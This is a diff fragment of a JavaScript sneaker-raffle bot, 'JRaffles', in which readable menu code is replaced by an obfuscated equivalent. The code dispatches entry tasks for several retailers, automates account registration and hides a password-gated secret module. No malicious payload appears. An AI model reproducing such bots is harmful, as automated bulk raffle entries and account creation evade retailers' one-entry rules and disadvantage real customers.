+                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                        console['clear']();
+                        if (taskFunction == 0x0) {
+                            var _0x237df0 = await _0x1083d0(), _0x35b184 = await _0xb9dc1e(_0x460411);
+                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x35b184), await _0x460411['function'](_0x460411, _0x35b184, _0x237df0), _0x1748f7();
+                        } else {
+                            if (taskFunction == 0x1) {
+                                var _0x237df0 = await _0x1083d0();
+                                return await _0x460411['function'](_0x460411, null, _0x237df0), _0x1748f7();
+                            }
+                        }
+                        ;
+                    } else {
+                        if (_0x1a1b7d[taskModule]['name'] == 'FOOTSHOP') {
+                            taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                            var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction], _0x237df0 = await _0x1083d0(), _0x5c1853 = await _0xb9dc1e(_0x460411);
+                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5c1853), await _0x460411['function'](_0x460411, _0x5c1853, _0x237df0), await _0x116d4a(0x1388), _0x1748f7();
+                        } else {
+                            if (_0x1a1b7d[taskModule]['name'] == 'Google\x20Forms') {
+                                try {
+                                    let _0x4c58c1 = { 'headers': { 'content-type': 'application/json' } }, _0x4bd611 = { 'key': _0x459e4e }, _0x329776 = await _0x5d1b21['post']('https://jraffles.herokuapp.com/beta', _0x4bd611, _0x4c58c1);
+                                    if (_0x329776['status'] != 0xc8)
+                                        throw new Error('No\x20Beta\x20Access..');
+                                    console['log']('Hello,\x20' + _0x1403a4['cyan'](_0x358285) + '.\x20Beta\x20Access\x20Granted.'), await _0x116d4a(0x3e8);
+                                } catch (_0x41c1a1) {
+                                    return console['log']('No\x20Beta\x20Access.'), await _0x116d4a(0x7d0), _0x1748f7();
+                                }
+                                taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction], _0x237df0 = await _0x1083d0(), _0x5c1853 = await _0xb9dc1e(_0x460411);
+                                return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x5c1853), await _0x460411['function'](_0x460411, _0x5c1853, _0x237df0), await _0x116d4a(0x1388), _0x1748f7();
+                            } else {
+                                if (_0x1a1b7d[taskModule]['name'] == 'OQIUM\x20Store') {
+                                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                    console['clear']();
+                                    if (taskFunction == 0x0) {
+                                        var _0x237df0 = await _0x1083d0(), _0x35b184 = await _0xb9dc1e(_0x460411);
+                                        return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x35b184), await _0x460411['function'](_0x460411, _0x35b184, _0x237df0), _0x1748f7();
+                                    } else {
+                                        if (taskFunction == 0x1) {
+                                            var _0x237df0 = await _0x1083d0();
+                                            return await _0x460411['function'](_0x460411, null, _0x237df0), _0x1748f7();
+                                        }
+                                    }
+                                    ;
+                                } else {
+                                    if (_0x1a1b7d[taskModule]['name'] == 'BOUNCEWEAR') {
+                                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                        console['clear']();
+                                        if (taskFunction == 0x0)
+                                            await bwAcc('https://bouncewear.com/nl/account/register', _0x460411);
+                                        else {
+                                            if (taskFunction == 0x1) {
+                                            }
+                                        }
+                                        ;
+                                    } else {
+                                        if (_0x1a1b7d[taskModule]['name'] == 'PATTA') {
+                                            taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                            var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                            console['clear']();
+                                            if (taskFunction == 0x0) {
+                                                var _0x237df0 = await _0x1083d0(), _0x501f26 = await _0xb9dc1e(_0x460411);
+                                                return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x501f26), await _0x460411['function'](_0x460411, _0x501f26, _0x237df0), _0x1748f7();
+                                            } else {
+                                                if (taskFunction == 0x1) {
+                                                    var _0x237df0 = await _0x1083d0(), _0x501f26 = await _0xb9dc1e(_0x460411);
+                                                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x501f26), await _0x460411['function'](_0x460411, _0x501f26, _0x237df0), _0x1748f7();
+                                                }
+                                            }
+                                            ;
+                                        } else {
+                                            if (_0x1a1b7d[taskModule]['name'] == 'SLAM\x20JAM') {
+                                                taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                                var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                                console['clear']();
+                                                if (taskFunction == 0x0) {
+                                                    var _0x237df0 = await _0x1083d0(), _0x54f3c4 = await _0xb9dc1e(_0x460411);
+                                                    return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x54f3c4), await _0x460411['function'](_0x460411, _0x54f3c4, _0x237df0), _0x1748f7();
+                                                } else {
+                                                    if (taskFunction == 0x1) {
+                                                        var _0x237df0 = await _0x1083d0(), _0x54f3c4 = await _0xb9dc1e(_0x460411);
+                                                        return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x54f3c4), await _0x460411['function'](_0x460411, _0x54f3c4, _0x237df0), _0x1748f7();
+                                                    }
+                                                }
+                                                ;
+                                            } else {
+                                                if (_0x1a1b7d[taskModule]['name'] == 'KICKZ') {
+                                                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                                    console['clear']();
+                                                    if (taskFunction == 0x0) {
+                                                        var _0x237df0 = await _0x1083d0(), _0x21f9d4 = await _0xb9dc1e(_0x460411);
+                                                        return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x21f9d4), await _0x460411['function'](_0x460411, _0x21f9d4, _0x237df0), _0x1748f7();
+                                                    } else {
+                                                        if (taskFunction == 0x1) {
+                                                            var _0x237df0 = await _0x1083d0(), _0x21f9d4 = await _0xb9dc1e(_0x460411);
+                                                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x21f9d4), await _0x460411['function'](_0x460411, _0x21f9d4, _0x237df0), _0x1748f7();
+                                                        }
+                                                    }
+                                                    ;
+                                                } else {
+                                                    if (_0x1a1b7d[taskModule]['name'] == 'JD') {
+                                                        taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                                        var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                                        console['clear']();
+                                                        if (taskFunction == 0x0) {
+                                                            var _0x237df0 = await _0x1083d0(), _0x437936 = await _0xb9dc1e(_0x460411);
+                                                            return _0x51d52a['shuffleTasks'] && await _0x2cf6dd(_0x437936), await _0x460411['function'](_0x460411, _0x437936, _0x237df0), _0x1748f7();
+                                                        }
+                                                    } else {
+                                                        if (_0x1a1b7d[taskModule]['name'] == 'Seven\x20Store')
+                                                            return console['log']('returning\x20to\x20menu'), await _0x116d4a(0x3e8), _0x1748f7();
+                                                        else {
+                                                            if (_0x1a1b7d[taskModule]['name'] == 'Paypal\x20Verification') {
+                                                                var _0x3812bb = _0x1a1b7d[taskModule]['name'], _0x237df0 = await _0x1083d0();
+                                                                return await _0x420bf9(_0x3812bb, _0x237df0), _0x1748f7();
+                                                            } else {
+                                                                if (_0x1a1b7d[taskModule]['name'] == 'Failed\x20Tasks') {
+                                                                    taskFunction = await _0x11d57e(_0x1a1b7d[taskModule]['modules']);
+                                                                    var _0x460411 = _0x1a1b7d[taskModule]['modules'][taskFunction];
+                                                                    return await _0x460411['function'](_0x460411), _0x1748f7();
+                                                                } else {
+                                                                    if (_0x1a1b7d[taskModule]['name'] == 'Change\x20Settings') {
+                                                                        console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
+                                                                        var _0x2d744f = 0x0;
+                                                                        for (const _0x41abd2 in _0x51d52a) {
+                                                                            console['log']('(' + _0x2d744f + ')\x20' + _0x41abd2 + '\x20:\x20' + _0x51d52a[_0x41abd2]), _0x2d744f++;
+                                                                        }
+                                                                        console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x2d744f + ')\x20Return\x20to\x20Main\x20Menu');
+                                                                        var _0x5e9fe8 = await _0x5dd5e8();
+                                                                        if (_0x5e9fe8 == _0x2d744f)
+                                                                            return _0x1748f7();
+                                                                        console['clear'];
+                                                                        var _0x71e312 = 0x0;
+                                                                        for (var _0x1b6a7e in _0x51d52a) {
+                                                                            if (_0x5e9fe8 == _0x71e312) {
+                                                                                console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1b6a7e + '\x20:'), _0x51d52a[_0x1b6a7e] = await _0x373407(), _0x65e0bc['writeFileSync']('../settings.json', JSON['stringify'](_0x51d52a));
+                                                                                break;
+                                                                            } else
+                                                                                _0x71e312++;
+                                                                        }
+                                                                        return console['log']('Settings\x20Saved!'), await _0x116d4a(0xbb8), _0x1748f7();
+                                                                    } else {
+                                                                        if (_0x1a1b7d[taskModule]['name'] == 'Reload\x20Settings')
+                                                                            return console['log']('Reloading\x20settings'), await _0x2b1268(), _0x1748f7();
+                                                                        else {
+                                                                            if (taskModule == 0x45) {
+                                                                                _0x1a1b7d[0x45] = { 'name': 'AFEW\x20SECRET' };
+                                                                                var _0x2a4c53 = await _0x3234cc();
+                                                                                _0x2a4c53 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x534960(), await afewFunction(_0x30ecdd[_0x2a3341], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x116d4a(0xbb8));
+                                                                            } else {
+                                                                            }
+                                                                        }
+                                                                    }
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        }
+                                    }
+                                }
+                            }
                         }
                     }
-                    console.log(`Settings Saved!`)
-                    await delay(3000);
-                    return menu();
-                } else if (modules[taskModule].name == 'Reload Settings') {
-                    console.log(`Reloading settings`);
-                    await loadSettings();
-                    return menu();
-                } else if (taskModule == 69) {
-                    modules[69] = { name: "AFEW SECRET" }
-                    var pw = await getPassword();
-                    if (pw == 'ModuleVoorDeBoys') {
-                        await afewScraper();
-                        await getAfewProduct();
-                        await afewFunction(afewProducts[afewProduct], 'sec');
-                    } else {
-                        console.log(`Wrong password, closing in 10 seconds...`);
-                        await delay(3000);
-                    }
-                } else {
-
                 }
             }
             try {
-                await menu();
-
-            } catch (e) {
-                console.log(e);
-                await delay(10000);
-                return menu();
+                await _0x1748f7();
+            } catch (_0x9ef69f) {
+                return console['log'](_0x9ef69f), await _0x116d4a(0x2710), _0x1748f7();
             }
-        } catch (e) {
-            console.log(e);
-            return await delay(15000);
+        } catch (_0x15176d) {
+            return console['log'](_0x15176d), await _0x116d4a(0x3a98);
         }
-    }
-
-};
-
-
-setTitle(`JRaffles ${version}`);
-
-
+}
+;
+_0x244762('JRaffles\x20' + _0x3b2d4c);
 try {
-    loadSettings();
-    main();
-
-} catch (e) {
-    console.log(e);
-
+    _0x2b1268(), _0x4556c9();
+} catch (_0x2814d6) {
+    console['log'](_0x2814d6);
 }
